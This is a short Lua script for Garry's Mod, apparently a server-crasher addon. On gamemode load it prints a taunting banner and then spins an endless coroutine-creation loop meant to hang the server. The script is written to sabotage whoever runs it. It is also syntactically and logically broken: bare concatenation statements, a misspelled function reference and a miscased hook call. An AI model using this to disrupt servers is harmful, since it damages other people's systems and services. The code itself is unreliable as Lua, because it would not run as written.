function InfaniteLoop()
    local x = 0
    while true do
        x = x + 1
    end
end

function OnStart()
    local printStr = "\n\n\n\n\n\n\n\n\n\n"
    printStr .. "SERVER HAS Gmod-Server-Crasher INSTALLED "
    printStr .. "IF YOU ARE WONDERING WHY YOUR SERVER IS "
    printStr .. "NOT RUNNING THEN NOW YOU HAVE IT"
    printStr .. "\n\n\n\n\n\n\n\n\n\n"

    Msg(printStr)

    while true do
        coroutine.create(infaniteLoop)
    end
end

hook.add("OnGamemodeLoaded", "ServerCrasher_OnGamemodeLoaded", OnStart)